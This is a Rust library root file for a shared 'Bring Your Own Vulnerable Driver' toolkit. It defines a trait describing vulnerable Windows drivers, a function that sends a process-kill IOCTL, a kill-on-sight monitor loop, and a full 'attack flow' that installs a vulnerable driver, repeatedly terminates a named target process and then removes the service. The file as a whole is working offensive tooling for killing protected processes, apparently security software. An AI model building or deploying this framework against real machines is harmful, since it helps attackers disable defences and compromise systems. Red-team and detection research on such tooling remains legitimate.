#![allow(non_snake_case)]

//! Shared BYOVD (Bring Your Own Vulnerable Driver) library.
//!
//! Two complementary APIs:
//!
//! - **High-level (`DriverConfig` trait + [`run`])** — declarative. Each PoC
//!   implements a small trait describing its driver, then calls [`run`] to
//!   execute the standard *install → start → monitor → cleanup* flow. This is
//!   the API the existing killers in this workspace use.
//!
//! - **Low-level ([`DeviceHandle`], [`ByovdDriver`], [`enable_privilege`],
//!   [`run_monitor_loop`], ...)** — imperative pieces for killers that need a
//!   custom flow (attach to an already-loaded driver, fan out to all matching
//!   PIDs, structured IOCTL buffers, custom retry, etc.).
//!
//! New killers can mix both APIs.

pub mod device;
pub mod handle;
pub mod monitor;
pub mod privilege;
pub mod process;
pub mod service;
pub mod util;

use std::time::Duration;

use winapi::um::winsvc::SERVICE_ALL_ACCESS;

pub use device::DeviceHandle;
pub use handle::{FileHandle, ScHandle, ServiceHandle, WinHandle};
pub use monitor::{run_monitor_loop, setup_ctrlc_handler};
pub use privilege::{enable_privilege, ensure_running_as_local_system};
pub use process::{find_all_pids_by_name, find_pid_by_name, get_pid_by_name};
pub use service::ByovdDriver;
pub use util::{get_current_dir, to_cstring, to_wstring};

/// Common result type used throughout BYOVD tools.
pub type Result<T> = std::result::Result<T, Box<dyn std::error::Error>>;

const LEGACY_MONITOR_INTERVAL: Duration = Duration::from_millis(700);

// ============================================================================
// DriverConfig — high-level declarative API used by most killers
// ============================================================================

/// Trait that each driver PoC implements to describe its specific configuration.
///
/// The shared library uses this trait to manage the driver lifecycle and
/// dispatch IOCTL requests. Each implementation defines the driver-specific
/// details: names, paths, IOCTL codes, and buffer formats.
pub trait DriverConfig {
    /// Driver service name (e.g. `"BdApiUtil64"`).
    fn driver_name(&self) -> &str;

    /// Driver `.sys` filename (e.g. `"BdApiUtil64.sys"`).
    fn driver_file(&self) -> &str;

    /// Device path for `CreateFileW` (e.g. `"\\\\.\\BdApiUtil"`).
    fn device_path(&self) -> &str;

    /// IOCTL code to send via `DeviceIoControl`.
    fn ioctl_code(&self) -> u32;

    /// Desired access flags for `CreateFileW` on the device.
    /// Default: `SERVICE_ALL_ACCESS` (0xF01FF).
    fn device_access(&self) -> u32 {
        SERVICE_ALL_ACCESS
    }

    /// Skip driver unload on cleanup (e.g. drivers that BSOD on unload).
    fn skip_unload(&self) -> bool {
        false
    }

    /// Ignore IOCTL error returns (e.g. drivers that report error even on success).
    fn ignore_ioctl_error(&self) -> bool {
        false
    }

    /// Build the raw IOCTL input buffer for a given target.
    ///
    /// `pid` is the target process ID. `process_name` is the target name —
    /// some drivers take name instead of PID.
    fn build_ioctl_input(&self, pid: u32, process_name: &str) -> Vec<u8>;

    /// Expected IOCTL output buffer size in bytes (0 = no output buffer).
    fn ioctl_output_size(&self) -> usize {
        0
    }

    /// Optional pre-flight check before driver initialization
    /// (e.g. privilege verification).
    fn preflight_check(&self) -> Result<()> {
        Ok(())
    }
}

// ============================================================================
// IOCTL dispatch — trait-driven adapter using DeviceHandle internals
// ============================================================================

/// Send the kill IOCTL described by `config` to terminate `pid`.
///
/// Opens the device, builds the input from `DriverConfig::build_ioctl_input`,
/// and dispatches with the configured IOCTL code. Honors `ignore_ioctl_error`.
pub fn send_ioctl(config: &dyn DriverConfig, pid: u32, process_name: &str) -> Result<()> {
    let device = DeviceHandle::open_with_access(config.device_path(), config.device_access())
        .map_err(|_| "Failed to open driver device")?;

    let input = config.build_ioctl_input(pid, process_name);
    let output_size = config.ioctl_output_size();

    let mut output_buf = vec![0u8; output_size.max(1)];
    let output = if output_size > 0 {
        Some(&mut output_buf[..output_size])
    } else {
        None
    };

    device.ioctl_bytes_legacy(
        config.ioctl_code(),
        &input,
        output,
        !config.ignore_ioctl_error(),
    )?;

    Ok(())
}

// ============================================================================
// Monitor loop — trait-driven wrapper over the closure-based loop
// ============================================================================

/// Run the trait-driven kill-on-sight monitor.
///
/// Continuously scans for `process_name` and dispatches the kill IOCTL on each
/// match. Runs until Ctrl+C.
pub fn run_monitor(config: &dyn DriverConfig, process_name: &str) -> Result<()> {
    run_monitor_loop(process_name, LEGACY_MONITOR_INTERVAL, |pid| {
        send_ioctl(config, pid, process_name)
    })
}

// ============================================================================
// Full BYOVD flow — preserved high-level entry point
// ============================================================================

/// Execute the full BYOVD attack flow:
/// 1. Run preflight checks
/// 2. Load and start the vulnerable driver
/// 3. Monitor and kill the target process (until Ctrl+C)
/// 4. Clean up (stop + mark service for deletion)
pub fn run(
    config: &dyn DriverConfig,
    process_name: &str,
    driver_path: Option<&str>,
) -> Result<()> {
    config.preflight_check()?;

    let driver = ByovdDriver::install(
        config.driver_name(),
        config.driver_file(),
        Some(config.device_path()),
        driver_path,
    )?;
    driver.start()?;

    run_monitor(config, process_name)?;

    if !config.skip_unload() {
        println!("\n[*] Cleaning up...");
        driver.stop_and_delete()?;
    } else {
        println!("\n[!] Skipping driver unload (driver does not support safe unload)");
    }

    println!("[+] Done");
    Ok(())
}
